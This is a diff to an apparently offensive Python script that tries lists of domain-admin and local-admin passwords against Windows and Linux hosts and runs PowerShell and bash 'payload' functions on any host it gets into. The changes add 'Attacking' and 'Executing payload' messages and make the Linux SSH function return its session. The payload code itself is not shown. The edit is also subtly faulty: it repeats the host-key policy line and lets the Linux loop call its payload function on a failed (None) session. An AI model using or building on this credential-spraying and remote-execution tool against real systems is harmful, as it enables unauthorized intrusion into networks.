@@ -39,8 +39,12 @@ def create_windows_session(host, username, password):
 def create_linux_session(host, username, password):
     session = paramiko.SSHClient()
     session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    session.connect(host, username=username, password=password, timeout=10)
-    session.close()
+    session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        session.connect(host, username=username, password=password, timeout=10)
+        return session  
+    except Exception:
+        return None
 
 
 def windows_execute(session):
@@ -95,23 +99,28 @@ def main():
         ]
 
         for host in windows_machines:
+            print(f"Attacking {host}...")
             found_session = False
             for password in windows_credentials:
                 if not found_session:
                     session = create_windows_session(host, f"{domain}\\{windows_domain_admin}", password)
                     if session is not None:
                         found_session = True
+                        print(f"Executing PS payload against {host}")
                         windows_execute(session)
                     else:
                         session = create_windows_session(host, local_admin, password)
                         if session is not None:
                             found_session = True
+                            print(f"Executing PS payload against {host}")
                             windows_execute(session)
 
         for host in linux_machines:
+            print(f"Attacking {host}...")
             for password in linux_credentials:
                 try:
                     session = create_linux_session(host, local_admin, password)
+                    print(f"Executing bash payload against {host}")
                     linux_execute(session)
                 except Exception:
                     continue
